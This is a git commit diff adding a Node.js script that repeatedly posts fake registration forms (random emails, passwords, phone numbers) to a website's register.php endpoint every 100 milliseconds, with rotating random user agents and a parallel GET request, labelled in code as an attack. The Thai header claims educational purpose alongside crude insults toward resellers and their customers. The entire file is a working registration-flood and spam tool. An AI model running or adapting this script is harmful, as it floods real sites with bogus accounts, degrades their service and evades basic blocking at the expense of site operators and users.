853f64a91fa9775dbeebd3f6929b66c105ee2d5e
TinnerKung <45807795+TinnerKung@users.noreply.github.com>
2020-06-29 23:32:56 +0700

    Update app.js

--- app.js
+++ app.js
@@ -1,28 +1,71 @@
+/*
+---------------------------------------------------------
+ทำเพือการศึกษา โดย TinnerKung
+แจกได้จำหน่ายพ่องตาย
+ของมันฟรีเสือกหาพ่อค้าดูด Script เอาไปโมให้เสียตัง
+ลูกค้าแม่งก็ควายชิปหาย
+
+- TinnerKung
+- Facebook https://www.facebook.com/sycertinnerkung
+- GitHub https://github.com/TinnerKung
+- Website https://sycerteam.tk
+
+---------------------------------------------------------
+*/
+function runflood() {
+
 var req = require('request');
+const https = require('https')
 var randomEmail = require('random-email');
 var randomstring = require("randomstring");
 var Choices = require('prompt-choices');
+var colors = require('colors/safe');
+var random_useragent = require('random-useragent');
 
+const urlget = 'localhost'; // URL FOR GET
+const urlfileget = '/system/data/register.php'; // URLFILE FOR GET
+const urlpost = 'https://localhost/system/data/register.php'; // URL FOR POST
+const portattack = '443' // PORT FOR GET & POST
+ 
 const phones = Math.floor(Math.random() * 9000000000) + 1000000000;
 const passwords = Math.floor(Math.random() * 900000000000) + 100000000000;
-const emails = randomEmail({ domain: 'mail.go.th' }); 
-// const emailb = new Choices(['@gmail.com','@hotmail.com','@outlook.com','@yahoo.com','@fastmail.fm','@mail.go.th']);
-// const emaila = (emails + '' ,emailb);
+const emails = randomEmail({ domain: 'sycerteam.tk' }); 
 const forms = { email: emails, password: passwords, repassword: passwords, nickname: randomstring.generate(7) , phone: phones };
 
-
 req.post({
-   url: 'https://linkurl.com/index.php',
+   url: urlpost,
    form: forms,
-   timeout: 100,
+   port: portattack,
    headers: { 
-      'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.110 Safari/537.36',
+      'User-Agent': random_useragent.getRandom(),
       'Content-Type' : 'application/x-www-form-urlencoded' 
    },
    method: 'POST'
   },
 
   function (e, r, body, headers) {
-      console.log(body);
+      console.log(colors.green('ยิงที่ลิงค์ ',urlpost)),
+      console.log(colors.green('ยิง PORT ',portattack)),
+      console.log(colors.green('ผลตอบกลับ ' , body));
       console.log(forms);
+      console.log(colors.green('ยิง proxy เครื่อง',random_useragent.getRandom()));
+      console.log(colors.green(forms));
+      
   },);
+
+  const options = {
+   hostname: urlget,
+   port: portattack,
+   path: urlfileget,
+   method: 'GET'
+ }
+ 
+ var req = https.request(options, (res) => {
+   console.log(colors.green(`statusCode: ${res.statusCode}`))
+ })
+ 
+ req.end()
+
+};
+
+ setInterval(runflood, 100);
